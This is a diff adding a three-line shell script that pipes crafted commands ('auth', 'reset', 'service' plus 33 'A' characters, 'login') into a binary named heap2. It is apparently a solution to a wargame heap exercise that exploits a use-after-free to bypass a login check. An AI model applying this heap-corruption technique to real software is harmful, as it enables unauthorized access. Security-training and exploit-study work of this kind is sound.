@@ -1,0 +1,3 @@
+#!/bin/sh
+
+python3 -c "print('auth \n' + 'reset\n' + 'service' + 'A'*33 + '\nlogin\n')" | ./heap2
